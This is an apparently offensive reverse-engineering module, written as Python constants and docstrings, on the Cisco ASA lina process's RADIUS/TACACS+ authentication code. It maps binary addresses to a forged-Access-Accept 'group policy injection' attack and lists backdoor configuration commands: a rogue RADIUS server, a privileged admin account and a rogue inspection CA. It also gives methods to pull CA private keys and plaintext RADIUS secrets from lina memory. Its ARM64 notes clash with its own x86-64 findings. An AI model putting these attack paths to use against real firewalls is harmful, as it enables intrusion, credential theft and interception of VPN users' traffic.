"""
cisco_asa_lina_re.py — Cisco ASA lina binary RE module

Targets the authentication/authorization subsystem in the lina process:
  lina = the monolithic ASA firewall process (ELF, dynamically linked)
  Auth surface: RADIUS NAS client, TACACS+ client, WebVPN/CSTP cut-through proxy

=== LINA ARCHITECTURE (all confirmed platforms) ===
  +------------------------------------------------+
  | Hardware (NIC, ASICs, crypto accelerators)     |
  +------------------------------------------------+
           ↓ drivers / PCI passthrough
  +------------------------------------------------+
  | Linux OS (kernel — manages HW, drivers, IPC)  |
  +------------------------------------------------+
           ↓ syscalls / IPC
  +------------------------------------------------+
  | LINA Engine (user-space monolithic process)    |
  |   Packet processing, NAT, ACL, VPN, AAA,       |
  |   WebVPN, CSTP, SAML, RADIUS/TACACS+ client   |
  |   Config: /etc/asa/config (or variant)         |
  |   Multi-context | Clustering | HA sync         |
  +------------------------------------------------+
           ↓ IPC / sensor API (FTD only)
  +------------------------------------------------+
  | Snort/Firepower Module (FTD only)              |
  |   Deep packet inspection, advanced malware      |
  +------------------------------------------------+
           ↓ management plane
  +------------------------------------------------+
  | Management Layer                               |
  |   CLI (LINA CLI ≈ classic ASA CLI)             |
  |   ASDM (Java desktop client via HTTPS/443)      |
  |   FMC (Firepower Management Center)            |
  |   REST API                                     |
  +------------------------------------------------+

  Key: classic ASA hardware = x86-64. ARM64 applies to ASA-on-Firepower chassis (FTD) only.
  LINA is NOT ARM64 on standard ASA hardware.

=== CONFIRMED FROM ASA 9.22.2.32 LINA (real binary, 2026-08-13) ===
  Build: asa9-22-2-32-smp-k8.bin -> rootfs.img (CPIO) -> asa/bin/lina
  Architecture: x86-64 ELF, stripped PIE, dynamically linked
  Size: 105MB
  BuildID: 88929a4c3f35a2c0786e01e63c2e64626666ef23
  PT_LOAD segments:
    R--  0x00000000..0x00ff8cf8  vaddr 0x00000000
    R-X  0x00ff9000..0x04378501  vaddr 0x00ff9000   ← EXEC segment
    R--  0x04379000..0x05522d3d  vaddr 0x04379000
    RW-  0x05522f68..0x0685b178  vaddr 0x05523f68

  Class attribute (attr 25) parsing function (NO Message-Authenticator check):
    Function vaddr: 0x03a4bda0  (function start, prologue 55 48 89 e5)
    strstr call site: 0x03a4bee6
      3a4bee6: LEA rsi, [OU=]    ; vaddr 0x43b7581 ("OU=\x00" in R-- segment)
      3a4bef0: CALL strstr        ; strstr(attr_value, "OU=")
      3a4bf01: LEA rdi, "OU="    ; strlen("OU=") = 3
      3a4bf14: LEA rcx, [rdx+rax]; ptr past "OU="
      3a4bf1b: CMP dl, 0x3b      ; ';' semicolon delimiter
      3a4bf24: LEA rdi,[rbp-0x241]; 256-byte output buffer
    Log format: "OU=%s (tunnelgroup %s)\n" at vaddr 0x497c510
    Log call site: vaddr 0x02c33a9e
    Callers of 0x3a4bda0: 0x3a4c365, 0x3a4c3fe, 0x3a4c5b9
    CRITICAL: no Message-Authenticator (attr 80) check in any caller path

=== CONFIRMED FROM ASA 9.14.2.14 LINA (real binary) ===
  Build: asa9-14-2-14-smp-k8.bin -> rootfs.img (CPIO) -> asa/bin/lina
  Architecture: x86-64 ELF (NOT ARM64)
  Size: 95MB stripped dynamically linked ELF
  BuildID: 65cd0306770da18bb71c057dc0dd1472391a1569
  NOTE: ARM64 would apply to ASA-on-Firepower (FTD) chassis; classic ASA HW = x86-64

  RADIUS VSA attribute strings confirmed in .rodata:
    cVPN3000-IETF-Radius-Class   — IETF Class attr (25) → group policy assignment
    cVPN3000-Group-Policy        — direct group policy from RADIUS
    cVPN3000-Cisco-AV-Pair       — Cisco AV-pair VSA
    cVPN3000-Tunnel-Group-Lock   — pin user to specific tunnel group
    Cisco-AV-pair                — standard Cisco VSA (vendor 9, attr 1)
    Tunnel-Group-Name            — attribute name used in assignment log messages
    DfltGrpPolicy                — default group policy name (literal in binary)
    DefaultWEBVPNGroup           — default WebVPN tunnel group name

  SAML (lasso library) functions confirmed:
    lasso_login_init_authn_request
    lasso_login_process_authn_response_msg
    lasso_login_build_authn_request_msg
    lasso_login_build_authn_response_msg
    lasso_saml2_assertion_validate_audience

  Class attribute injection surface (confirmed string):
    "Class attribute created from LDAP-Class attribute"
    → lina processes LDAP group membership → RADIUS Class attr (attr 25) → group policy

  dACL (downloadable ACL) RADIUS processing confirmed:
    "aaai_dacl_processing_required"
    "dACL processing skipped: no ATTR_FILTER_ID found"
    "dACL %s already exists, using number %d"
    COA mode: "%s: Processing a dacl in COA-PUSH mode. Old server is [%A]"

Architecture reference (ARM64 AAPCS — "9780128192221-arm64-assembly" ch.5):
  X0–X7    : function args (first 8); X0 = return value
  X8–X15   : volatile (caller-saved); X16/X17 = linker scratch
  NOTE: x86-64 SysV ABI applies to real lina (RDI/RSI/RDX/RCX/R8/R9 for args)
  X19–X28  : non-volatile (callee-saved); must be restored before RET
  X29 (FP) : frame pointer — always saved in prologue
  X30 (LR) : link register — holds return address after BL
  SP       : stack pointer — always 16-byte aligned
  BL label : branch-and-link (call); saves PC+4 → X30
  RET      : branches to X30

Standard function prologue:
  STP  x29, x30, [sp, #-N]!   ; allocate frame, save FP+LR
  MOV  x29, sp                 ; establish frame pointer
  STP  x19, x20, [sp, #M]     ; save non-volatile regs if used

Standard function epilogue:
  LDP  x19, x20, [sp, #M]
  LDP  x29, x30, [sp, #-N]!... (or ADD sp, sp, #N)
  RET

RADIUS protocol (RFC 2865):
  Packet: Code(1) + Identifier(1) + Length(2) + Authenticator(16) + Attributes(var)
  Code 1  = Access-Request
  Code 2  = Access-Accept
  Code 3  = Access-Reject
  Code 11 = Access-Challenge (MFA / SDI New-PIN mode)
  User-Password attr (2): MD5(shared_secret + Request-Authenticator) XOR password
    — 16-byte blocks, chained: c[i] = p[i] XOR MD5(S + c[i-1])
  Shared secret: PSK stored as string in .data or .rodata of lina

TACACS+ protocol (RFC 8907):
  Header: MajorVer(1) + MinorVer(1) + Type(1) + SeqNo(1) + Flags(1) + SessionID(4) + Length(4)
  Body encrypted with: XOR against MD5(key + session_id + ver + seq_no) chain
  Port: TCP/49
"""

import struct, hashlib, socket, os, re, sys


# ─── ARM64 CALLING CONVENTION REFERENCE ──────────────────────────────────────

ARM64_REGS = {
    'args':        ['x0','x1','x2','x3','x4','x5','x6','x7'],
    'return':      ['x0'],           # x0 primary, x1/x2/x3 for structs
    'volatile':    ['x0','x1','x2','x3','x4','x5','x6','x7',
                    'x8','x9','x10','x11','x12','x13','x14','x15'],
    'scratch':     ['x16','x17'],    # intra-procedure / PLT trampoline
    'nonvolatile': ['x19','x20','x21','x22','x23','x24','x25',
                    'x26','x27','x28'],
    'fp':          'x29',            # frame pointer
    'lr':          'x30',            # link register (return address)
    'sp':          'sp',             # 16-byte aligned always
    'zr':          'xzr',            # zero register
}

# standard prologue pattern to detect function boundaries in IDA/objdump output
ARM64_PROLOGUE_PATTERN = re.compile(
    r'stp\s+x29,\s*x30,\s*\[sp,\s*#-?(\d+)\]!',
    re.IGNORECASE
)

# indirect call via vtable (common for C++ polymorphic handlers in lina):
# LDR  x8, [x0]          ; load vtable ptr from object
# LDR  x9, [x8, #offset] ; load fn ptr from vtable
# BLR  x9                ; call through vtable
ARM64_VTABLE_CALL = re.compile(
    r'ldr\s+(x\d+),\s*\[(x\d+)\][^\n]*\n.*?blr\s+\1',
    re.IGNORECASE | re.DOTALL
)


# ─── RADIUS PROTOCOL CONSTANTS ───────────────────────────────────────────────

RADIUS_CODES = {
    1:  'Access-Request',
    2:  'Access-Accept',
    3:  'Access-Reject',
    4:  'Accounting-Request',
    5:  'Accounting-Response',
    11: 'Access-Challenge',
    12: 'Status-Server',
    13: 'Status-Client',
    40: 'Disconnect-Request',
    41: 'Disconnect-ACK',
    42: 'Disconnect-NAK',
    43: 'CoA-Request',
    44: 'CoA-ACK',
    45: 'CoA-NAK',
}

RADIUS_ATTRS = {
    1:  'User-Name',
    2:  'User-Password',       # MD5 XOR with shared secret
    3:  'CHAP-Password',
    4:  'NAS-IP-Address',
    5:  'NAS-Port',
    6:  'Service-Type',
    7:  'Framed-Protocol',
    8:  'Framed-IP-Address',
    18: 'Reply-Message',
    24: 'State',               # used in Access-Challenge multi-round auth
    25: 'Class',
    26: 'Vendor-Specific',     # Cisco VSA = vendor 9
    27: 'Session-Timeout',
    61: 'NAS-Port-Type',
    79: 'EAP-Message',         # RFC 3579
    80: 'Message-Authenticator', # HMAC-MD5 of entire packet
}

# Cisco VSA (vendor 9) attribute numbers relevant to ASA VPN auth:
CISCO_VSA = {
    1:  'cisco-av-pair',       # e.g. "ip:addr-pool=vpn-pool"
    146: 'Cisco-SAML-Token',
    150: 'DAP-Policy-List',
}

# Default UDP ports for RADIUS (old vs. new RFC 2866):
RADIUS_PORTS = {
    'auth_old': 1645,
    'acct_old': 1646,
    'auth':     1812,
    'acct':     1813,
    'coa':      3799,          # RFC 5176 Change-of-Authorization
}

TACACS_PORT = 49              # TCP


# ─── LINA CLI SURFACE MAP ─────────────────────────────────────────────────────
#
# Security relevance: gaining LINA CLI access (via K8s exec→virsh console→macOS→ASA
# console or via VPN-to-management) leaks the full config including Type 7 secrets.
# Type 7 is XOR — fully reversible.

LINA_CLI_COMMANDS = {
    'show running-config': {
        'desc': 'full running configuration in plaintext',
        'security': 'leaks RADIUS shared secrets (Type 7 XOR), TACACS+ keys, VPN PSKs, '
                    'enable passwords, AAA server IPs, SSL trustpoint certs',
        'secret_types': {
            'type5': 'MD5-crypt — offline crackable with john/hashcat',
            'type7': 'XOR — fully reversible, zero GPU required',
            'type8': 'PBKDF2-SHA256 — GPU-hard but no salt uniqueness guarantee',
            'type9': 'scrypt — strongest; still offline crackable given resources',
        },
        'vpn_chain_value': 'RADIUS shared secret → forge Access-Accept → group policy injection',
    },
    'show version': {
        'desc': 'software + hardware version, uptime, serial number',
        'security': 'exact version → CVE lookup; serial number → warranty/support lookup; '
                    'uptime → reboot timing for persistence',
    },
    'show interface': {
        'desc': 'interface IPs, security levels, duplex/speed',
        'security': 'reveals internal segment IPs, management interface address',
    },
    'show access-list': {
        'desc': 'all configured ACLs with hit counts',
        'security': 'reveals permitted traffic patterns; hit counts indicate active paths',
    },
    'show nat': {
        'desc': 'NAT translation table',
        'security': 'reveals internal host IP space; dynamic NAT entries reveal active sessions',
    },
    'show vpn-sessiondb': {
        'desc': 'all active VPN sessions with user, IP, bytes, duration',
        'security': 'session tokens (if AnyConnect), user enumeration, internal IP assignments; '
                    'if COA is available can terminate arbitrary sessions',
    },
    'show crypto ikev1 sa': {
        'desc': 'IKEv1 security associations',
        'security': 'peer IPs, SPI values, auth method; SPI + captures = offline crypto attack',
    },
    'show crypto ikev2 sa': {
        'desc': 'IKEv2 security associations',
        'security': 'peer IPs, SPIs, cipher suites; weak suites → downgrade attack surface',
    },
    'show ssl': {
        'desc': 'SSL policy status, cipher suites, decryption state',
        'security': 'identifies decryption-enabled interfaces; active trustpoints',
    },
    'show crypto ca certificates': {
        'desc': 'installed CA and identity certificates',
        'security': 'certificate subjects/issuers; if CA cert installed for SSL inspection, '
                    'attacker can forge certs signed by that CA',
    },
    'configure terminal': {
        'desc': 'enter global config mode',
        'security': 'gate to all write commands; full RCE equivalent via aaa-server/radius config',
        'attack_primitives': [
            'aaa-server HACKED host <ip> key <secret>  → add rogue RADIUS server',
            'username admin privilege 15 password <p>  → add backdoor admin',
            'crypto ca trustpoint EVIL ...              → inject rogue CA for SSL intercept',
            'ssl trust-point EVIL outside               → swap inspection cert',
        ],
    },
    'write memory': {
        'desc': 'save running config to startup config (persist changes)',
        'security': 'makes any config change persistent across reboots',
    },
}

LINA_CONFIG_FILE_PATHS = {
    'asa':  ['/etc/asa/config', '/mnt/disk0/running-config', '/mnt/disk0/startup-config'],
    'ftd':  ['/ngfw/etc/sf/asa/running-config', '/var/sf/config/cisco_rules/'],
    'logs': ['/var/log/asa/', '/mnt/disk0/log/'],
}


# ─── SSL/TLS INSPECTION ATTACK SURFACE ───────────────────────────────────────
#
# LINA acts as MITM for SSL inspection:
#   Client → [TLS with LINA's cert] → LINA → [TLS with server's cert] → Server
# Requires a CA cert (trustpoint) installed on ASA.
#
# Attack surface:
#   1. Steal/forge the inspection CA private key → forge certs for any HTTPS site
#      inspected by this ASA; all client traffic decryptable offline.
#   2. SSL policy is applied per-interface — bypassing via interface pivot avoids inspection.
#   3. Certificate pinned clients (HPKP / cert pinning) break inspection → fail-open configs
#      may allow traffic through uninspected.
#   4. ASDM SSL bypass (av.class trust-all) means the ASDM admin session itself is
#      vulnerable to MitM even while the firewall inspects others.

LINA_SSL_INSPECTION = {
    'mechanism': (
        'LINA presents its own certificate (from configured trustpoint) to the client, '
        'decrypts traffic, applies policy/inspection, re-encrypts with server certificate. '
        'Client must trust the ASA CA certificate.'
    ),
    'config_commands': {
        'trustpoint_create': [
            'crypto ca trustpoint <NAME>',
            '  enrollment terminal',
            '  subject-name CN=asa.example.com',
            'crypto ca authenticate <NAME>',
            'crypto ca import <NAME> certificate',
        ],
        'ssl_policy': [
            'ssl policy <POLICY_NAME>',
            '  match any',
            '  decrypt',
            '  trustpoint <NAME>',
        ],
        'enable_decryption': [
            'ssl decryption enable',
            'ssl policy <POLICY_NAME>',
            'ssl policy <POLICY_NAME> interface outside',
        ],
        'status_check': [
            'show ssl',
            'show crypto ca certificates',
            'show ssl decryption statistics',
        ],
    },
    'attack_surfaces': {
        'ca_key_theft': {
            'method': 'extract inspection CA private key from lina memory or config',
            'impact': 'offline decrypt all inspected sessions; forge certs for any domain',
            'path': '/proc/$(pidof lina)/mem → find trustpoint struct → private key bytes',
        },
        'policy_bypass_via_interface': {
            'method': 'route traffic through interface not covered by ssl policy',
            'impact': 'uninspected traffic; used if inside-to-outside inspection only',
        },
        'asdm_mitm_trust_all': {
            'method': 'av.class checkServerTrusted returns void — ASDM admin accepts any cert',
            'impact': 'intercept ASDM admin credentials even while ASA inspects user traffic',
            'binary_evidence': 'CAFEBABE at 0x00213f62 in 1265F6 blob from asdm-7161.bin',
        },
        'fail_open_pinned_clients': {
            'method': 'send pinned-cert client traffic; observe if ASA fails open or drops',
            'impact': 'if fail-open: pinned clients bypass inspection entirely',
        },
    },
    'ftd_differences': {
        'managed_by': 'FMC (Firepower Management Center) — ssl policy in FMC GUI',
        'snort_integration': 'decrypted traffic fed to Snort for deep inspection',
        'policy_path': 'Policies > SSL > Create Policy in FMC',
    },
    'lina_internal_model': {
        'library': 'OpenSSL (linked into lina; confirmed by strings libssl/libcrypto in lina)',
        'session_setup_pattern': (
            'SSL_CTX_new(TLS_server_method())  ; client-facing context\n'
            'SSL_CTX_use_certificate_file()    ; inspection trustpoint cert\n'
            'SSL_CTX_use_PrivateKey_file()     ; trustpoint private key\n'
            'SSL_CTX_new(TLS_client_method())  ; server-facing context (no cert verify)'
        ),
        'relay_pattern': (
            'select()/poll() on both client_fd and remote_fd\n'
            'SSL_read(ssl_client) → inspect → SSL_write(ssl_server)\n'
            'SSL_read(ssl_server) → inspect → SSL_write(ssl_client)'
        ),
        're_targets': [
            'SSL_CTX_new xrefs → find SSL init function',
            'SSL_read xrefs → find relay loop (select+SSL_read+SSL_write triplet)',
            'SSL_CTX_use_PrivateKey_file or EVP_PKEY → find trustpoint key load',
            'X509_get_pubkey or SSL_get_peer_certificate → find cert inspection path',
        ],
        'ca_key_extraction': (
            'trustpoint private key loaded into EVP_PKEY struct in lina heap.\n'
            '/proc/$(pidof lina)/mem → scan for EVP_PKEY magic (first 4 bytes = type field).\n'
            'Extracting key → offline decrypt of all previously captured SSL sessions.'
        ),
    },
}


# ─── KNOWN ASA AAA BINARY PATTERNS ──────────────────────────────────────────
#
# These are string patterns expected in the lina ARM64 ELF that anchor
# the RADIUS/TACACS+ processing functions. Strings in lina are typically
# null-terminated in .rodata, unlike Go's length-prefixed string pool.

LINA_STRING_ANCHORS = {
    # RADIUS state machine anchor strings
    'radius_access_request':  b'Access-Request',
    'radius_access_accept':   b'Access-Accept',
    'radius_access_reject':   b'Access-Reject',
    'radius_access_challenge':b'Access-Challenge',
    'radius_shared_secret':   b'radius-server\x00',
    'radius_timeout':         b'radius-server timeout',

    # TACACS+ anchor strings
    'tacacs_key':             b'tacacs-server key\x00',
    'tacacs_host':            b'tacacs-server host\x00',

    # AAA group config strings
    'aaa_server_group':       b'aaa-server\x00',
    'aaa_authentication':     b'aaa authentication\x00',
    'aaa_authorization':      b'aaa authorization\x00',
    'aaa_accounting':         b'aaa accounting\x00',

    # Crypto anchors (RADIUS password hashing uses MD5)
    'md5_init':               b'MD5Init\x00',
    'md5_update':             b'MD5Update\x00',
    'md5_final':              b'MD5Final\x00',

    # VPN auth context strings
    'anyconnect_auth':        b'AnyConnect\x00',
    'webvpn_group_policy':    b'group-policy\x00',
    'vpn_filter_acl':         b'vpn-filter\x00',
    'vpn_session_db':         b'VPN Session DB\x00',

    # Error message anchors useful for locating auth failure paths
    'aaa_error_server':       b'AAA Server is not responding\x00',
    'aaa_error_reject':       b'Authentication Failure\x00',
    'aaa_debug_radius':       b'RADIUS packet\x00',

    # CONFIRMED in ASA 9.14.2.14 lina (x86-64, 95MB stripped):
    # RADIUS VSA attribute name strings (null-terminated in .rodata)
    'cvpn3000_ietf_class':    b'cVPN3000-IETF-Radius-Class\x00',
    'cvpn3000_group_policy':  b'cVPN3000-Group-Policy\x00',
    'cvpn3000_av_pair':       b'cVPN3000-Cisco-AV-Pair\x00',
    'cvpn3000_tg_lock':       b'cVPN3000-Tunnel-Group-Lock\x00',
    'cisco_av_pair':          b'Cisco-AV-pair\x00',
    'tunnel_group_name':      b'Tunnel-Group-Name\x00',
    'dflt_grp_policy':        b'DfltGrpPolicy\x00',
    'default_webvpn_group':   b'DefaultWEBVPNGroup\x00',
    'class_from_ldap':        b'Class attribute created from LDAP-Class attribute\x00',
    'dacl_coa_push':          b'Processing a dacl in COA-PUSH mode\x00',
    'saml_init_authn':        b'lasso_login_init_authn_request\x00',
    'saml_process_resp':      b'lasso_login_process_authn_response_msg\x00',
    'saml_validate_audience': b'lasso_saml2_assertion_validate_audience\x00',
}

# ─── RADIUS VSA DISPATCH TABLE (CONFIRMED ASA 9.14.2.14) ────────────────────
#
# Two interleaved tables in lina's .data/.bss region map cVPN3000 VSA names
# to lina-internal attribute tokens used by the AAA processing engine.
#
# TABLE-1 (index/lookup) — file offset 0x7a16f8, 24-byte triplets:
#   {str_ptr_64, table2_next_ptr_64, flags_u64=0x8}
#   str_ptr = vaddr of cVPN3000 VSA name string in .rodata
#   table2_next_ptr = vaddr of next entry's str_ptr in TABLE-2 (iterator ptr)
#   flags = 0x8 for all 40 confirmed entries
#
# TABLE-2 (data) — vaddr 0x54e2948, file 0x52e2948, 16-byte pairs:
#   {str_ptr_64, internal_code_u64}
#   internal_code encoding (LE, bottom 32 bits significant):
#     byte[0] = lina internal attribute token ID (sequential)
#     byte[1] = type/flags (0x10 = group-policy domain for most; 0x00 for IETF-mapped attrs)
#     byte[2] = data type class (0x00=IETF, 0x01=bool/enum, 0x02=int, 0x06=flags, 0x07=octet-string)
#     byte[3] = 0x00
#
# KEY ENTRIES CONFIRMED (from binary scan):
RADIUS_VSA_TABLE = {
    # (str_name, vaddr_in_table2, internal_code, decoded)
    'cVPN3000-IETF-Radius-Session-Timeout': (0x54e2948, 0x2001c, 'token=0x1c,type=0x02=int'),
    'cVPN3000-IETF-Radius-Idle-Timeout':    (0x54e2958, 0x11019, 'token=0x19,type=0x01=bool/enum'),
    # === GROUP POLICY INJECTION SURFACE ===
    # IETF Class attribute (attr 25): lina maps it internally as token=0x0b, type=0x07 (octet-string)
    # Attack path: RADIUS Access-Accept with Class attr (25) containing group-policy name
    #   → lina processes Class as octet-string → extracts group-policy name string
    #   → assigns VPN session to named group-policy (tunnel-group, ACL, split-tunnel config)
    # String confirmed at file offset 0x3f0e610: "cVPN3000-IETF-Radius-Class"
    # Companion string confirmed: "Class attribute created from LDAP-Class attribute"
    'cVPN3000-IETF-Radius-Class':    (0x54e2968, 0x7000b,  'token=0x0b,type=0x07=octet-string,ATTACK_SURFACE'),
    'cVPN3000-IETF-Radius-Filter-Id':(0x54e2978, 0x210ce,  'token=0xce,type=0x02=int'),
    'cVPN3000-Auth-Service-Type':    (0x54e2988, 0x21054,  'token=0x54,type=0x02=int'),
    'cVPN3000-Tunnel-Group-Lock':    (0x54e2b28, 0x71056,  'token=0x56,type=0x07=octet-string,ATTACK_SURFACE'),
    'cVPN3000-Authorization-Type':   (0x54e29b8, 0x11043,  'token=0x43,type=0x01=bool/enum'),
    'cVPN3000-WebVPN-SVC-Enable':    (0x54e2ab8, 0x21068,  'token=0x68,type=0x02=int'),
    'cVPN3000-WebVPN-ACL-Filters':   (0x54e29f8, 0x1104c,  'token=0x4c,type=0x01=bool/enum'),
    'cVPN3000-Firewall-ACL-In':      (0x54e2b38, 0x71057,  'token=0x57,type=0x07=octet-string'),
    'cVPN3000-Firewall-ACL-Out':     (0x54e2b48, 0x61058,  'token=0x58,type=0x06=flags'),
}

# ─── CONFIRMED CODE ADDRESSES (ASA 9.14.2.14, x86-64) ───────────────────────
#
# LDAP-CLASS → RADIUS-CLASS INJECTION PATH (confirmed from binary):
#
#  Function at ~0xc613xx:
#    Processes LDAP authentication response, reads LDAP-Class attribute
#    Prepares RADIUS Class (attr 25) attribute record in stack buffer at -0x40(rbp)
#
#  Key instruction sequence at 0xc61458:
#    mov $0x19, %edx          ; EDX = 25 = IETF RADIUS Class attribute number
#    call 0xc567e0            ; attr_add_shim(attr_list=RDI, value=RSI, attr_type=25, ...)
#
#  attr_add_shim at 0xc567e0:
#    movzwl %dx, %edx         ; zero-extend attr_type to 32-bit
#    mov $0x1, %ecx           ; ECX = 1 (adding 1 attribute)
#    jmp 0xc563d0             ; tail-call to attr_list_add_impl
#
#  attr_list_add_impl at 0xc563d0:
#    Signature: (attr_list_ptr=RDI, value_struct=RSI, attr_type=EDX, count=ECX)
#    - Reads value_struct type field: movzwl (%rsi),%r15d
#    - Iterates linked list: compares attr_type with r13w at each 16-byte node
#    - When type matches: calls 0x23f3dc0 (malloc) to allocate node
#    - Checks attribute category: (attr_type & 0xf000) == 0x6000 → string type
#
#  Debug log at 0xc6148f + call 0x10fc730:
#    LEA RDX = "Class attribute created from LDAP-Class attribute\n" (0x3be5230)
#    ESI = 3 (log level), EDI = 0xc5 (205 = AAA debug facility)
#    → Only fires when debug logging enabled (testb $0x20, flag checked at 0xc61482)
#
CONFIRMED_FUNCTION_ADDRS = {
    'ldap_class_to_radius_class':  0xc61360,  # approx; see 0xc61458 for attr_type=25 MOV
    'attr_add_shim_class':         0xc567e0,  # shim: adds attr type=25 (Class) to attr list
    'attr_list_add_impl':          0xc563d0,  # generic attribute list add/update
    'attr_list_find_by_type':      0xc56800,  # iterate list, find by type field
    'malloc_wrapper':              0x23f3dc0, # called by attr_list_add_impl for node alloc
    'aaa_debug_log':               0x10fc730, # debug logging function (facility, level, fmt, ...)
}

# ─── CONFIRMED CODE ADDRESSES (ASA 9.22.2.32, x86-64) ───────────────────────
#
# Binary: asa9-22-2-32-smp-k8.bin → CPIO rootfs.img → asa/bin/lina (105MB stripped PIE)
# BuildID: 88929a4c3f35a2c0786e01e63c2e64626666ef23
# RE method: radare2 axt (xref) + LEA RIP-relative scan + prologue backward search
#
# x86-64 SysV ABI: args in RDI/RSI/RDX/RCX/R8/R9; return in RAX
# RIP-relative LEA: target_vaddr = instr_vaddr + instr_len(7) + disp32

CONFIRMED_9222232_ADDRS = {
    # Class attr (attr 25) / OU= parsing function
    'class_attr_parse_fn':          0x03a4bda0,  # function start (55 48 89 e5 prologue)
    'class_attr_strstr_call':       0x03a4bee6,  # CALL strstr(attr_value, "OU=")
    'class_attr_ou_string_vaddr':   0x043b7581,  # "OU=\x00" in R-- segment (strstr 2nd arg)
    'class_attr_semicolon_check':   0x03a4bf1b,  # CMP dl, 0x3b  (';' delimiter loop)
    'class_attr_output_buf_lea':    0x03a4bf24,  # LEA rdi,[rbp-0x241]  256-byte stack buf
    'class_attr_log_fmt_vaddr':     0x0497c510,  # "OU=%s (tunnelgroup %s)\n"
    'class_attr_log_callsite':      0x02c33a9e,  # CALL to aaa debug log function
    # Callers of 0x3a4bda0 (3 confirmed xrefs)
    'class_attr_caller_1':          0x03a4c365,
    'class_attr_caller_2':          0x03a4c3fe,
    'class_attr_caller_3':          0x03a4c5b9,
}

# x86-64 SysV ABI calling convention reference (replaces ARM64 notes above):
X86_64_ABI = {
    'arg_regs':    ['rdi', 'rsi', 'rdx', 'rcx', 'r8', 'r9'],
    'return':      'rax',
    'volatile':    ['rax', 'rcx', 'rdx', 'rsi', 'rdi', 'r8', 'r9', 'r10', 'r11'],
    'nonvolatile': ['rbx', 'rbp', 'r12', 'r13', 'r14', 'r15'],
    'frame':       'rbp',
    'stack':       'rsp (16-byte aligned before CALL)',
    'prologue':    '55 48 89 e5       ; PUSH rbp; MOV rbp,rsp',
    'epilogue':    '5d c3             ; POP rbp; RET  (or LEAVE; RET)',
    'rip_lea':     'target = instr_vaddr + 7 + disp32  (for LEA reg,[RIP+disp32])',
}

# LDAP-Class string (log/debug message, not the attribute name itself):
#   file offset 0x3be5230: "Class attribute created from LDAP-Class attribute\n"
#   Note: terminated with \n, then NUL padding (not \n\x00 but \n\x00\x00\x00\x00\x00)

# GROUP POLICY INJECTION CHAIN (RADIUS Class attribute path):
#
# Attack: forge or relay a RADIUS Access-Accept with a crafted Class (attr 25) value
#   Value bytes = name of an existing group policy (e.g. b"DfltGrpPolicy\x00")
#   The group policy must exist in ASA config — RADIUS cannot CREATE a new one,
#   only SELECT an existing named policy.
#
# Effect of selecting a different group policy:
#   - Override split-tunnel ACL → full-tunnel → MITM all client traffic
#   - Override ACL (vpn-filter) → broader network access
#   - Override idle-timeout / session-timeout → persistent sessions
#   - Override DNS servers → DNS hijack
#
# Known group policy names (default, always present):
KNOWN_DEFAULT_GROUP_POLICIES = [
    b'DfltGrpPolicy',    # confirmed literal in lina .rodata
    b'DefaultWEBVPNGroup',  # confirmed literal in lina .rodata
]

# The cVPN3000-Group-Policy VSA (vendor 3076, attr ?) is the DIRECT path:
# RADIUS Access-Accept with cVPN3000-Group-Policy = "DfltGrpPolicy" sets group policy directly.
# String confirmed in .rodata at file offset 0x3f0e80a.

# RADIUS client function chain in lina (typical symbol names in debug builds;
# in production builds these are recovered via string cross-references):
LINA_RADIUS_FUNCTIONS = {
    'radius_send_access_request':  {
        'xref_strings': ['Access-Request', 'NAS-IP-Address'],
        'signature': 'CALL MD5Init, CALL MD5Update(shared_secret), CALL MD5Update(authenticator), CALL MD5Final',
        'x86_64_pattern': (
            # loads shared_secret ptr → RDI or RSI, then CALLs MD5
            r'lea\s+r[ds]i,\s*\[rip\+0x[0-9a-f]+\].*?'
            r'call\s+.*?md5'
        ),
    },
    'radius_verify_message_authenticator': {
        'xref_strings': ['Message-Authenticator'],
        'description': 'RFC 2869 attr 80: HMAC-MD5 of entire packet using shared secret',
    },
    'radius_decode_user_password': {
        'xref_strings': ['User-Password', 'user-password'],
        'description': 'decrypts User-Password attr: p = c XOR MD5(S + auth[i-1])',
    },
    'aaa_server_group_select':     {
        'xref_strings': ['aaa-server', 'aaa authentication'],
        'description': 'selects active RADIUS/TACACS+ server from group; load-balances',
    },
    'aaa_process_response':        {
        'xref_strings': ['Access-Accept', 'Access-Reject', 'Access-Challenge'],
        'description': 'main AAA response dispatcher — branches on Code field',
    },
}


# ─── STATIC ANALYSIS METHODOLOGY ─────────────────────────────────────────────
#
# Procedure for locating RADIUS shared secret storage in lina ARM64 ELF:
#
# 1. strings -n 8 lina | grep -E "^[A-Za-z0-9!@#$%^&*]{8,64}$"
#    — Find candidate PSK strings. RADIUS keys are typically 8–64 chars.
#
# 2. Cross-reference each candidate with the MD5 call chain:
#    In ARM64, the shared secret is loaded via ADRP+ADD and passed as X0 to MD5Update.
#    Pattern: ADRP x0, page; ADD x0, x0, :lo12:offset; BL md5update
#    The page+offset resolves to the PSK string's .rodata address.
#
# 3. RADIUS authenticator field (16 bytes at offset 4 in packet) is random in
#    Access-Request and MD5 of full packet in Access-Response.
#    The shared_secret is NEVER sent on wire — it stays in lina's memory.
#
# 4. If lina is running and accessible via /proc/self/mem (pivot):
#    - Map /proc/$(pidof lina)/mem
#    - Read the .data segment where AAA server configs are stored
#    - The aaa-server struct contains: server_ip, port, shared_secret (plaintext)

STATIC_ANALYSIS_METHODOLOGY = {
    'step1_extract_strings': {
        'cmd': 'strings -n 8 -t x lina',
        'purpose': 'recover .rodata strings with virtual addresses; anchor MD5 call xrefs',
    },
    'step2_disassemble': {
        'cmd': 'objdump -d --no-show-raw-insn -M intel lina | grep -A 30 "radius\\|aaa_server"',
        'purpose': 'locate RADIUS packet construction functions near string anchors; use Intel syntax',
    },
    'step3_find_md5_chain': {
        'pattern': 'look for CALL to same function 3+ times in same function body',
        'rationale': 'MD5Init, MD5Update (key), MD5Update (data), MD5Final — 4 calls in sequence',
    },
    'step4_trace_psk': {
        'pattern': 'LEA rdi/rsi,[RIP+disp32] immediately before CALL md5update',
        'x86_64': 'RIP-relative LEA loads 64-bit ptr; target_vaddr = instr+7+disp32; result in RDI/RSI = string ptr',
    },
    'step5_aaa_struct_layout': {
        'description': 'reconstruct aaa_server_group_t struct from field accesses',
        'fields': [
            'name[64]       — server group name',
            'protocol       — 0=RADIUS, 1=TACACS+, 2=SDI',
            'server_count   — number of servers',
            'dead_time      — minutes (default 10)',
            'max_failed     — default 3',
            'servers[]      — array of aaa_server_t',
        ],
    },
    'step6_server_struct': {
        'aaa_server_t_fields': [
            'host[64]       — IP or hostname',
            'port           — uint16 (1812 default)',
            'secret[128]    — shared secret PLAINTEXT',
            'timeout        — uint32 (10s default)',
            'retries        — uint8 (2 default)',
